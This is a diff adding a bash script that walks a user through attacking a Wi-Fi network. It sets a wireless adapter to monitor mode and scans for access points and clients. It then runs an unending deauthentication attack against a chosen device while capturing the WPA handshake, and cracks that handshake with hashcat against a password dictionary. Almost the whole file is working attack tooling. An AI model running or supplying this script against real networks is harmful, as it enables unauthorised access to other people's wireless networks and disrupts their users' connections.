@@ -1,0 +1,152 @@
+#!/usr/bin/env bash
+
+# Colors for different kinds of text
+gt_string_prompt_color_start="\033[1;36m"
+gt_string_log_color_start="\033[1;33m"
+gt_string_label_color_start="\033[1;32m"
+gt_string_warning_color_start="\033[1;35m"
+gt_string_error_color_start="\033[1;31m"
+gt_string_color_end="\033[0m"
+
+# Function to log text
+gt_log () {
+    echo -e "${gt_label}${gt_string_log_color_start}${@}${gt_string_color_end}"
+}
+
+# Function to log warning
+gt_warning () {
+    echo -e "${gt_label}${gt_string_warning_color_start}WARNING: ${@}${gt_string_color_end}"
+}
+
+# Function to throw an error
+gt_error () {
+    echo -e "${gt_label}${gt_string_error_color_start}ERROR: ${@}${gt_string_color_end}"
+}
+
+# Function to prompt for a value
+gt_prompt () {
+    echo -e "${gt_label}${gt_string_prompt_color_start}${1}${gt_string_color_end}"
+    read -p "> " ${2}
+}
+
+# Function to prompt for a character
+gt_prompt_for_character () {
+    echo -e "${gt_label}${gt_string_prompt_color_start}${1}${gt_string_color_end}"
+    read -n1 -r -p "> " "${2}"
+    echo ""
+}
+
+# Function to pause for a keypress
+gt_pause () {
+    gt_prompt_for_character "${1}" gt_temp
+}
+
+# Function to prompt for a confirmation
+gt_confirm () {
+    gt_prompt_for_character "${1} (y/n) " gt_temp
+
+    if [ "${gt_temp}" == "y" ] || [ "${gt_temp}" == "Y" ]; then
+        "${2}"
+    else
+        if [ "${3}" ]; then
+            gt_log "${3}"
+        fi
+    fi
+}
+
+# Function to abort with exit-code 0
+gt_abort () {
+    gt_error "Aborting..."
+    exit 0
+}
+
+# Function to abort setup for an arbitary reason
+gt_abort_because () {
+    gt_error "${@}"
+    gt_abort
+}
+
+# Function to handle last commands success/failure
+gt_handle_last_command_status () {
+    if [ "${1}" -eq "0" ]; then
+        gt_log "${2}"
+    else
+        gt_abort_because "${3}"
+    fi
+}
+
+# Function to attempt cleanup before exit
+gt_windup () {
+    sudo airmon-ng stop ${v_network_adapter}mon
+}
+
+# Function to crack hashes
+gt_crack_hashes () {
+    gt_prompt "Please specify a passwords dictionary to use" v_passwords_dictionary
+    gt_log "Starting to crack hashes using ${v_password_dictionary}."
+    gt_log "This may take a long while..."
+    hashcat -m 22000 ${v_packets_file}_hashcat.txt $v_passwords_dictionary
+    gt_log "Guessing process complete!"
+    hashcat --show ${v_packets_file}_hashcat.txt
+}
+
+# Main entry point to the program
+main () {
+    # Warn about running network services
+    gt_warning "Please stop all network services before proceeding!"
+    gt_pause "Press any key to proceed once you've done so..."
+
+    # Prompt for network adapter to use
+    gt_prompt "Please specify the network adapter to use" v_network_adapter
+
+    # Start monitoring on the chosen network adapter
+    sudo airmon-ng start $v_network_adapter
+    gt_handle_last_command_status "${?}" \
+                                  "" \
+                                  "Could not start monitoring on $v_network_adapter!"
+
+    # Find available access points
+    gt_log "Starting to look for access points on ${v_network_adapter}mon..."
+    gt_pause "Press any key to start searching, then press \"q\" twice to stop."
+    sudo airodump-ng ${v_network_adapter}mon
+
+    # Look for devices on the selected network
+    gt_prompt "Please specify the SSID of the network to use" v_network_ssid
+    gt_prompt "Please specify the channel to use" v_network_channel
+    gt_log "Starting to look for devices on ${v_network_ssid}, channel ${v_network_channel}..."
+    gt_pause "Press any key to start searching, then press \"q\" twice to stop."
+    sudo airodump-ng -d $v_network_ssid -c $v_network_channel ${v_network_adapter}mon
+
+    # Run a de-auth attack for the selected device
+    gt_prompt "Please specify the station-id to de-auth" v_network_station_id
+    gt_prompt "Please specify a file to capture packets into" v_packets_file
+    v_packets_file=/tmp/$v_packets_file
+    gt_log "Starting to capture handshake packets on ${v_network_adapter}..."
+    gt_log "Starting to de-auth ${v_network_station_id} on ${v_network_ssid}..."
+    gt_pause "Press any key to start, then press \"C-c\" to stop."
+    sudo hcxdumptool -i ${v_network_adapter}mon -o $v_packets_file &
+    pid=$!
+    sudo aireplay-ng -0 0 -a $v_network_ssid -c $v_network_station_id ${v_network_adapter}mon
+    kill -9 $pid
+    gt_log "Packets captured!"
+
+    # Stop monitoring
+    gt_windup
+
+    # Resume stopped network services
+    gt_warning "You may resume network services now."
+
+    # Convert packet dumps for hashcat
+    hcxpcapngtool -o ${v_packets_file}_hashcat.txt $v_packets_file
+    if ! [ -f ${v_packets_file}_hashcat.txt ]; then
+        gt_abort_because "The captured packets do not contain enough EAPOL frames!"
+    fi
+
+    # Prompt to start guessing process
+    gt_confirm "Start cracking hashes now?" \
+               gt_crack_hashes \
+               "You may run the guesses on hashes later on the file ${v_packets_file}_hashcat.txt"
+}
+
+# Start
+main
